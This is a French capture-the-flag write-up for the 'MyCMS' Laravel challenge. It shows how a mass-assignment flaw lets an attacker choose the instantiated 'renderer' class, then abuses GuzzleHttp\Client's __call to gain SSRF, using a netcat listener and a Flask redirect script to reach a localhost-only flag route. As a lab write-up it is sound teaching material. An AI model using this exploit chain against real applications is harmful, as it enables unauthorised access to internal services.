# MyCMS (1/1)

## Solve

Dans ce challenge, on récupère le code source d'une lourde application dévelopée à l'aide du framework Laravel.
On remarque que cette application permet de créer des formulaires et de les voir/expoter en PDF.
Je ne rentrerais pas dans le détail de comment celle-ci fonctionne, juste dans l'exploitation.

Si l'on observe le fichier `src/app/Models/Form.php` (qui est le fichier qui représente la base de données pour PHP), on remarque qu'aucun champ n'est spécifié comme `protected`.
Dans le fichier `src/app/Http/Controllers/FormController.php`, dans la fonction `process`, au moment de la création le code suivant est exécuté :

```php
<?php
[...]
$current_user = User::select("id")->where("email", $request->session()->get('email'))->first();
$to_insert = array_merge(request()->except('_token'), ["user_id" => $current_user["id"]]);
Form::create($to_insert);
echo '{"ok":"Le formulaire a bien été créé !"}';
```

Ici, l'application récupère tous les paramètres POST (excepté `_token`) pour insérer en base de données. Bien que le paramètre `renderer` ne soit pas spécifié dans le frontend, on peut donc le spécifié dans la requête POST pour qu'il soit pris en compte lors de l'insertion. 

Ce paramètre va avoir son importance dans la suite du challenge, en effet, le champ `renderer` de la table `forms` est utilisé (de base) par l'application, pour render le form graphiquement à l'utilisateur, et est défini par défaut à `App\FormParser`, regardons le fichier `src/app/Http/Controllers/FormController.php` :

```php
<?php
[...]
$form_user = User::select('email')->where('id',$form["user_id"])->first();
if($form_user["email"] !== $request->session()->get('email'))
{
    return view('form', ['error' => 'Ce formulaire ne vous appartient pas.']);
    exit;
}
else
{
    try{
        $renderer = new $form["renderer"]($form['name'], $form['nb_fields'], $form["content"]);
    } catch(\Throwable $e) {
        $renderer = new $form["renderer"]();
        $renderer->handleError($form['name']);
        return view('form', ['error' => $renderer->error]);
    }
    [...]
}
```

Avec la vulnérabilité présentée précédemment, on a donc la capacité d'instancié n'importe quelle classe du projet avec un constructeur prenant 0,1,2 ou 3 paramètres (PHP n'étant pas sensible au nombre de paramètres à passer dans le constructeur si cela rempli tout ceux required).

Si l'on regarde la liste des classes disponibles dans le dossier `vendor/` (qui correspond aux librairies tierces), une semble particulièrement intéressant: `GuzzleHttp\Client`, en effet, pour cette première étape, on remarque que la route `/flag1` dans le fichier `src/app/Http/Controllers/AdminController.php` ne peut être appelée que depuis localhost, et qu'il nous faut donc une SSRF.

Dans le code qui instancie une classe ci-dessus, on remarque aussi l'appel à la fonction `handleError`, sur l'object précédemment créé, avec comme paramètre le nom du formulaire.

En PHP, si l'on appel une fonction qui n'existe pas sur un objet, celui-ci va tenter d'appeler la méthode `__call` de cet objet si elle est définie, et, dans la classe `GuzzleHttp\Client`, on remarque la présence d'une méthode `__call`:

```php
<?php
[...]
public function __call($method, $args)
{
    if (\count($args) < 1) {
        throw new InvalidArgumentException('Magic request methods require a URI and optional options array');
    }

    $uri = $args[0];
    $opts = $args[1] ?? [];

    return \substr($method, -5) === 'Async'
        ? $this->requestAsync(\substr($method, 0, -5), $uri, $opts)
        : $this->request($method, $uri, $opts);
}
```

Dans cette fonction `__call`, `$method` correspond au nom de la méthode qui a été tenté d'être appelée sur l'objet, dans notre cas, `handleError`, et `$uri` correspond au nom du formulaire.
On peut donc faire une SSRF en mettant dans le renderer `GuzzleHttp\Client`, et dans le nom du formulaire l'URL de l'attaquant.

Lorsqu'on fait cela et qu'on tente de render le formulaire, on recoit la requete suivante :

```bash
$ nc -lnvp 4444
Connection from 172.16.0.3:40056
HANDLEERROR / HTTP/1.1
Host: localhost:4444
User-Agent: GuzzleHttp/7
```

Ici il reste un dernier soucis à résoudre, en effet, laravel va rejeter la requête car le VERB HTTP est `HANDLEERROR`, il faut donc faire un script flask sur lequel on enverra la requete guzzle, pour le redirigé vers `http://127.0.0.1/flag1` :

```py
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/', methods=["HANDLEERROR"])
def index():
    return redirect('http://127.0.0.1/flag1')

app.run(host='0.0.0.0', port=4444)
```

On réactualise la page principale du challenge, et on récupère le premier flag.

## Flag

BZHCTF{ssrf_thr0ugh_php_1nst4nc14t10n}